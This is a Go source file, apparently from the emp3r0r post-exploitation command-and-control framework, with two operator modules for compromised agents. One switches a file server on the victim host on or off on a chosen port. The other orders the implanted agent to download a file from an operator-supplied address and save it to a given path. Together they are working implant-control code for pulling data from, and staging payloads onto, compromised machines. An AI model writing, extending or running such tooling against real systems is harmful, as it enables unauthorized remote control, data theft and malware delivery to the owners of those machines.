package modules

import (
	"fmt"

	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/agents"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
)

func moduleFileServer() {
	switchOpt, ok := live.AvailableModuleOptions["switch"]
	if !ok {
		logging.Errorf("Option 'switch' not found")
		return
	}
	server_switch := switchOpt.Val

	portOpt, ok := live.AvailableModuleOptions["port"]
	if !ok {
		logging.Errorf("Option 'port' not found")
		return
	}
	cmd := fmt.Sprintf("%s --port %s --switch %s", def.C2CmdFileServer, portOpt.Val, server_switch)
	err := agents.SendCmd(cmd, "", live.ActiveAgent)
	if err != nil {
		logging.Errorf("SendCmd: %v", err)
		return
	}
	logging.Infof("File server (port %s) is now %s", portOpt.Val, server_switch)
}

func moduleDownloader() {
	requiredOptions := []string{"download_addr", "checksum", "path"}
	for _, opt := range requiredOptions {
		if _, ok := live.AvailableModuleOptions[opt]; !ok {
			logging.Errorf("Option '%s' not found", opt)
			return
		}
	}

	download_addr := live.AvailableModuleOptions["download_addr"].Val
	checksum := live.AvailableModuleOptions["checksum"].Val
	path := live.AvailableModuleOptions["path"].Val

	cmd := fmt.Sprintf("%s --download_addr %s --checksum %s --path %s", def.C2CmdFileDownloader, download_addr, checksum, path)
	err := agents.SendCmdToCurrentAgent(cmd, "")
	if err != nil {
		logging.Errorf("SendCmd: %v", err)
		return
	}
}
